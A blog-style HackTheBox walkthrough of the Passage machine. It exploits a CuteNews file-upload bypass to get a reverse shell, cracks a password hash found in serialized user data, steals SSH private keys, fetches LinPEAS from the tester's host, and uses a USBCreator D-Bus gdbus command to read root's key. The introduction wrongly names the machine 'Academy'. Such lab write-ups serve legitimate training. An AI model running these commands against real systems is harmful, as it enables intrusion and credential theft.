<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Passage HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/passage-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-03-10T17:57:49+00:00">March 10, 2021</time><time class="updated" datetime="2025-06-22T10:38:14+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to crack a machine called the Academy. It was created by egre55 &amp; mrb3n. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Enumerated CuteNews CMS</span></li>
<li><span style="color: #000000;">Register New User</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Exploit File Upload in Personal Options</span></li>
<li><span style="color: #000000;">Updating the /etc/hosts file</span></li>
<li><span style="color: #000000;">Getting shell as www-data</span></li>
<li><span style="color: #000000;">Enumerating CuteNews CMS files</span></li>
<li><span style="color: #000000;">Decoding Base64 php serialized data</span></li>
<li><span style="color: #000000;">Getting Paul’s Password Hash</span></li>
<li><span style="color: #000000;">Decoding Paul’s Password</span></li>
<li><span style="color: #000000;">Logging as Paul</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating .ssh Folder</span></li>
<li><span style="color: #000000;">Getting id_rsa and id_rsa.pub files</span></li>
<li><span style="color: #000000;">Using id_rsa file to SSH as nadav</span></li>
<li><span style="color: #000000;">Transferring LinPEAS</span></li>
<li><span style="color: #000000;">USBCreator D-Bus Privilege Escalation</span></li>
<li><span style="color: #000000;">Getting root id_rsa key</span></li>
<li><span style="color: #000000;">Logging SSH as root</span></li>
<li><span style="color: #000000;">Reading the Root Flag</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">To Attack any machine, you need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
<p><span style="color: #000000;"><strong>IP Address assigned: 10.129.109.173</strong></span></p>
<p><span style="color: #000000;">Now that you have the IP Address. You need to enumerate open ports on the machine. For this, you will be running a nmap scan.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC 10.129.109.173</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X-liAScGH8A/YEkCvWbjGUI/AAAAAAAAutg/qIUWxBEBk7ksUOt3C4I2oeRL6fexpZthQCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that SSH (22), HTTP (80) are running on the machine.</span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Open the IP Address in the Web Browser. It is a blog site with a bunch of random words. Nothing of interest. The top post mentions Implemented Fail2Ban. So, keeping in mind that, we enumerated other blog posts and stuff. Reaching the footer, we see that CuteNews is used here.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0Hs2Lv3s-jo/YEkC7X6xwHI/AAAAAAAAutk/z39MZJNpNIIl8UVOhDKzTIRd7dySS8THACLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">The implementation of CuteNews means there must be a /CuteNews/ directory. Upon doing so we are presented by a login page with the version information of Cute News – 2.1.2</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-B9yoMcmZfss/YEkC_QMtw4I/AAAAAAAAuts/0BRY3Hs1WfMaJWZXta94hoLWaDNyq759gCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Since we don’t have any credentials, instead of bruteforcing we try enumerating other links. The Register Link works. We fill up the form to create a user by the name of ignite.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ykm4EDCJpOo/YEkDEV9lctI/AAAAAAAAutw/CskcZkcmjYgzpgmWZKIIJVlGL4bBCilHwCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Creating an account will take you to a profile page with some statistics and a dashboard. Clicking on the Personal Option will lead you to a General Options page with a file upload functionality.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mz9n6eLvffA/YEkDIXk7rUI/AAAAAAAAut0/JOXWVJ2G4fA1mg0Ao7GsyooUuDCLgUlwACLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Although we attempted to upload numerous files, we were only allowed to upload PHP files. We used Burp to examine and discovered that the upload is being restricted by some local code. It functions properly when we attempt to upload a standard image file. In order to get over the upload filter, it’s time to modify the payload by including a GIF98 Magic Byte.</span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nLbKOZNeal4/YEkDMA7f5iI/AAAAAAAAut4/YVy3XrJo3yUQLCAClEUtbnrIOl9WenWMQCLcBGAsYHQ/s16000/6.1.png"/></span></p>
<p><span style="color: #000000;">We uploaded the newly crafted payload to find that it was uploaded although the Avatar now get broken as shown in image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K4eIEwBFVmk/YEkDQWtfGzI/AAAAAAAAut8/C5sz7v_1sC8kSa-2VZyiB9tj06e9uRCogCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">The user uploads a file that has a double Extension with the php extension followed by a png extension. Before submitting using the Save Changes, capture the request using Burp Suite. Since the Client-Side Verification of the Extension exists, clicking on the Save Changes bypasses that verification. But in order to execute the payload, we actually need it to be of proper extension.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hOmdIUx7Y6A/YEkDYaos7bI/AAAAAAAAuuI/SjqVHxpT6vk6Mpi6ERkfiJDebdYp2xdEACLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">We changed the extension to php as shown in the image below and forwarded the request to the server to see if the file uploads properly or not.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eNf9ay6i5Ck/YEkDeuWvSoI/AAAAAAAAuuQ/1o0DRKM7KxcJ7jhSXTEttgk8JNvJFeb1ACLcBGAsYHQ/s16000/8.png"/></span></p>
<h4><span style="color: #000000;">Configuring Hosts File</span></h4>
<p><span style="color: #000000;">We tried to find the URL from that broken Avatar Image that we saw earlier and it hinted that the URL must have the passage.htb as hosts. So, we edit our /etc/hosts/ file to add passage.htb.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
10.129.109.173  passage.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qhMr34Nwe8A/YEkDjTS-TEI/AAAAAAAAuuY/zfEjD-opp60N6fFYwKQxbtp8gByZXMSvgCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Now changing the URL, we try to execute the payload by browsing the name of the file followed by the uploads folder on the CuteNews CMS. Although before executing the payload make sure to start a netcat listener on the same port as mentioned in the payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://passage.htb/CuteNews/uploads/avatar_ignite_shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vlXbtTbFLiA/YEkDocKI0HI/AAAAAAAAuug/C3LtWsL1FBcdFIa5bu_ds96hWLThVCHIACLcBGAsYHQ/s16000/10.png"/></span></p>
<h4><span style="color: #000000;">Gaining Initial Access</span></h4>
<p><span style="color: #000000;">As soon as the payload is executed, we get ourselves a session on the target machine. The shell however lacks some ability so let’s upgrade it to TTY shell using the python one-liner. We start to enumerate the CMS directory to find a directory called cdata. When traversing inside we see that there is a user folder that seemed interesting.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
python -c 'import pty;pty.spawn("/bin/bash")'
pwd
cd /var/www/html
ls
cd Cu
cd cdata
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zFZoixoJEUg/YEkDuGehPPI/AAAAAAAAuuk/vKvnUIOo30sdnwVPhNYmn2toDHBIgixkACLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">After going inside the “users” directory, we see that there are a bunch of php files. We try to look into one of the files to find we see some encoded text that makes no sense at all.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd users
ls
cat b0.php
&lt;?php die('Direct call - access denied'); ?&gt;
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo0OiIweGRmIjthOjk6e3M6MjoiaWQiO3M6MTA6IjE1OTk1OTQ1MTgiO3M6NDoibmFtZSI7czo0OiIweGRmIjtzOjM6ImFjbCI7czoxOiI0IjtzOjU6ImVtYWlsIjtzOjEzOiIweGRmQDB4ZGYuY29tIjtzOjQ6Im5pY2siO3M6NDoiMHhkZiI7czo0OiJwYXNzIjtzOjY0OiJmM2I5ZjU4NTE4ZjJiMjEyNDY3YThhYjUxNzRmMTMyNGQ4Y2JkZmNiYjkwMjhiMTYzNjA1MTA1Zjg1OTc5MTQ2IjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czo2OiJhdmF0YXIiO3M6MjI6ImF2YXRhcl8weGRmX2F2YXRhci5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rq1wSAmBpwg/YEkDy9YrrBI/AAAAAAAAuuo/MVw7XzE64TUtabFtAktrF0-UtkSsNbd9ACLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">We try to decode the encrypted text using a Base64 decoder. It looks like some serialized data with the user paul and a password field which contains the password hash as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8luo7mLwYPI/YEkD5vuoq_I/AAAAAAAAuuw/UP9SreL7WoEZb5xtWEm29ruXlav_b8WFACLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">We tried to detect the hash and found that it was sha256. There is very little hope to decrypt it unless we try to crack it using some online hash cracker. The password is cracked and it is “atlanta1”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5kgNc1oyEvM/YEkEAapoPNI/AAAAAAAAuu4/ZSZ57aL-fRQW-p8cFZLjQG80jdDaqO-PwCLcBGAsYHQ/s16000/14.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
atlanta1</pre>
<p><span style="color: #000000;">Using the su command, we signed in as user Paul. In order to locate any user.txt, we searched the home directory. We discover a.ssh directory as well. Upon traversing it, the id_rsa file and id_rsa.pub file were found. We look for the nadav@passage user in the pub file. It is possible that this key is for the nadav user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su paul
atlanta1
cd paul
ls -la
cat user.txt
cd .ssh
ls -la</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kJkuOZVDm_A/YEkEFWvQvMI/AAAAAAAAuvA/3B63q0-R1swgwtp6rI47ELWPLXNcxMcpQCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">We use the cat command to read the contents of the id_rsa file. We copy it to our local machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat id_rsa
cat id_rsa.pub</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mzBOFuxJ5Cw/YEkENoQHp-I/AAAAAAAAuvI/Q1ub8zDTQxQgDpGMfh6mIF6E1b0hiLoDwCLcBGAsYHQ/s16000/16.1.png"/></span></p>
<p><span style="color: #000000;">Then, we paste the contents of the id_rsa file into the key and use it to access the target machine as nadav user. After logging in through SSH we move to the temp folder and transfer the LinPEAS script. We execute it after giving it proper permissions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano key
chmod 600 key
ssh -i key nadav@10.129.109.173
cd /tmp
wget 10.10.14.38:8000/lenpeas.sh
chmod 777 lenpeas.sh
./lenpeas.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-noZV_K2093g/YEkE2keWIYI/AAAAAAAAuvY/AfdMSGDMxu0Fsw9VKryfzAWaocsHlUXpwCLcBGAsYHQ/s16000/16.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation </strong></span></h3>
<p><span style="color: #000000;">After running for a while LinPEAS tells us that the target machine is vulnerable to USBCreator D-Bus Exploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DNhIK_OsEXI/YEkE76hI99I/AAAAAAAAuvc/CyEHccN6xnMfIEWvxRNxkLmgx9M4-iqcQCLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">We google this exploit in order to find a way to use it to elevate privileges on the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xCzVVmm8XbQ/YEkFAwvbgcI/AAAAAAAAuvg/O295B9hZDZk4LzeurRAgqQzI6JjePI5aQCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">The vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoers group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite/read arbitrary files with arbitrary content, as root – without supplying a password. This trivially will lead to elevated privileges.</span></p>
<p><span style="color: #000000;">Here, we will use gdbus to interact with the dbus and call the USBCreator to exploit it to read the id_rsa file of the root user and copy its contents to a text file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/raj.txt true</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F-JFiQjep8o/YEkFGGASdkI/AAAAAAAAuvk/9pXwippDfRUO7-lkNyBhO-d7omY5frMywCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">We see that someone has created a text file by the name of raj.txt in the temp directory. Upon reading it, we can say that someone has pasted the contents of the id_rsa file of root into this text file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
cat raj.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sXhbDSH-2xo/YEkFLo2B4iI/AAAAAAAAuvo/MsDMy_Hjkj4f2SYBdWQQ39WIJVA1dCt6ACLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">We take the id_rsa file and create a new key by the name of rootkey and then use it to login through SSH as root user. At last, we conclude this lab by reading the root flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano rootkey
chmod 600 rootkey
ssh -i rootkey root@10.129.109.173
cd /root
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sf-XDMmBqvw/YEkFQEupokI/AAAAAAAAuvs/NqmJpHX1Rx09m0_2Gb4weuCQWUpp5u8vQCLcBGAsYHQ/s16000/21.png"/></span></p>
<h3><span style="color: #800000;"><strong>Alternative Root</strong></span></h3>
<p><span style="color: #000000;">Instead of getting the id_rsa key to our local system, we can directly use it to get root on the target system. We can use the key we generated to login as ssh directly from the target machine. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/shell_rsa true
ssh -i shell_rsa root@127.0.0.1
ls
root.txt
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2LvBmZ79hX0/YEkFfrFSZGI/AAAAAAAAuv8/vM-BNSOLlP82Dwr_1wYUgEwpSZKYRoCiQCLcBGAsYHQ/s16000/22.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
